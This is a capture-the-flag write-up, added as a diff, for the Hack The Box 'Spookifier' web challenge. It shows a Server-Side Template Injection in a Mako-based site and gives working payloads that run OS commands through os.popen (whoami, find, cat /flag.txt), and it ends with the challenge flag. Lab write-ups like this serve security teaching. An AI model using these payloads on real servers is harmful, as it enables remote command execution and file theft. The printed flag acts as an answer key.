@@ -1,0 +1,67 @@
+---
+tags: [web]
+---
+# Spookifier
+
+- **Description:** There's a new trend of an application that generates a spooky name for you. 
+Users of that application later discovered that their real names were also magically changed, causing havoc in their life. 
+Could you help bring down this application?
+- **Difficulty:** Very easy
+
+---
+
+## 🔎 Solution
+The website provides an interface with an input field for entering a name, which is then stylized using different fonts. 
+For example, entering "Doran" produces the following result.
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./doran.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+Examining the source code, specifically in `application/util.py`, reveals the website uses the **Mako** template engine.
+```
+from mako.template import Template
+```
+
+Using template engines like Mako, Jinja2, Twig, or EJS can introduce **Server-Side Template Injection (SSTI)** vulnerabilities if user input is directly incorporated into the template without proper sanitization.
+
+Testing with a simple payload determines if the site is vulnerable:
+```
+${7*7}
+```
+
+The response returns `49`, confirming an SSTI vulnerability.
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./49.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+Referencing SSTI payloads [this resource](https://techbrunch.github.io/patt-mkdocs/Server%20Side%20Template%20Injection/#plugins), the following payload is used to identify the current user:
+```
+<% import os; out = os.popen("whoami").read(); %>${out}
+```
+
+The output confirms the process is running as the `root` user.
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./whoami.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+A payload is then used to locate the flag file:
+```
+<% import os; out = os.popen("find / -type f -name flag.txt").read(); %>${out}
+```
+
+The result shows the flag is located at `/flag.txt`.
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./find.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+Finally, the flag's content is retrieved using the payload:
+```
+<% import os; out = os.popen("cat /flag.txt").read(); %>${out}
+```
+Executing this payload reveals the flag.
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./flag.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+## 🚩Flag
+> `HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}`
